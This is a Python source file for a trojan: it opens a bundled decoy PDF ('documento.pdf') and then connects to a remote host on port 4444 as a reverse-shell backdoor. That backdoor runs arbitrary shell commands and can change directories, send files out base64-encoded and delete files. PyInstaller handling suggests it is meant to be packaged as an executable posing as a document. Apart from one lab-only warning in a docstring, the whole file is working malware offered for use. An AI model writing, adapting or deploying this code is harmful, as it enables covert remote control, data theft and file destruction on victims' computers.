import subprocess
import os
import sys
import tempfile
import socket
import base64


# ---------------- PDF Handling ----------------
def open_pdf(pdf_name):
    """
    Opens a PDF file using the default PDF viewer on Windows.

    This function handles both cases:
    1. When running as a standalone Python script.
    2. When running as a PyInstaller-generated executable.

    Parameters:
    pdf_name (str): The name of the PDF file to open. The file should
                    either be in the same directory as the script or
                    included in the PyInstaller bundle.
    """
    # Check if the script is running as a PyInstaller executable
    if getattr(sys, 'frozen', False):
        # _MEIPASS is a temporary folder where PyInstaller extracts
        # bundled files when running the executable
        bundle_dir = sys._MEIPASS
    else:
        # If running as a regular script, use the directory of the script
        bundle_dir = os.path.dirname(os.path.abspath(__file__))

    # Construct the full path to the PDF
    pdf_path = os.path.join(bundle_dir, pdf_name)

    # Open the PDF using the default Windows application for PDF files
    # 'start' is a Windows shell command to open files with their associated program
    subprocess.Popen(["start", pdf_path], shell=True)


# ---------------- Backdoor Class ----------------
class Backdoor:
    """
    Implements a simple TCP backdoor client that connects to a remote server
    and executes commands received from it.

    WARNING: This code should only be used in isolated lab environments for
    educational purposes. Do NOT use this on production machines or
    unauthorized networks.
    """

    def __init__(self, ip, port):
        # Create a TCP socket
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            # Connect to the specified remote host and port
            self.connection.connect((ip, port))
            self.send("[+] Connection established.\n")
        except Exception as e:
            print(f"[-] Could not connect: {e}")

    def send(self, data):
        """Send data to the remote server."""
        if isinstance(data, str):
            data = data.encode()
        self.connection.sendall(data)

    def receive(self):
        """Receive data from the remote server."""
        return self.connection.recv(4096).decode().strip()

    def change_directory(self, path):
        """Change the current working directory."""
        try:
            os.chdir(path)
            return f"[+] Changed directory to {os.getcwd()}\n"
        except Exception as e:
            return f"[-] {str(e)}\n"

    def execute_shell(self, command):
        """Execute a shell command and return the output."""
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            return e.output

    def download_file(self, path):
        """Read a file and return its contents encoded in base64."""
        try:
            with open(path, "rb") as f:
                encoded = base64.b64encode(f.read()).decode()
                return encoded
        except Exception as e:
            return f"[-] {str(e)}"

    def remove_file(self, path):
        """Remove a file from the filesystem."""
        try:
            os.remove(path)
            return "[+] File removed successfully.\n"
        except Exception as e:
            return f"[-] {str(e)}\n"

    def handle_command(self, command):
        """
        Handle a single command received from the server.
        Supports:
        - cd <path>
        - download <path>
        - remove <path>
        - any shell command
        """
        if command.startswith("cd "):
            return self.change_directory(command[3:].strip())
        elif command.startswith("download "):
            return self.download_file(command[9:].strip())
        elif command.startswith("remove "):
            return self.remove_file(command[7:].strip())
        else:
            return self.execute_shell(command)

    def run(self):
        """Main loop to continuously receive and execute commands."""
        try:
            while True:
                command = self.receive()
                if command.lower() in ["exit", "quit"]:
                    break
                result = self.handle_command(command)
                self.send(result)
        finally:
            self.connection.close()


# ---------------- Main Execution ----------------
if __name__ == "__main__":
    """
    Main entry point of the program:
    1. Changes working directory to the system's temporary folder.
    2. Opens the PDF using the default PDF viewer.
    3. Connects to the remote backdoor server and starts command loop.
    """
    # Use system temporary directory for file extraction / execution
    temp_dir = tempfile.gettempdir()
    os.chdir(temp_dir)

    # Open the PDF file (must be included with PyInstaller or in script directory)
    open_pdf("documento.pdf")

    # Configure the remote host and port for the backdoor connection
    HOST = "192.168.1.11"  # Change to your lab server
    PORT = 4444
    try:
        shell = Backdoor(HOST, PORT)
        shell.run()  # Start the backdoor command loop
    except Exception as e:
        print(f"[-] Backdoor failed: {e}")
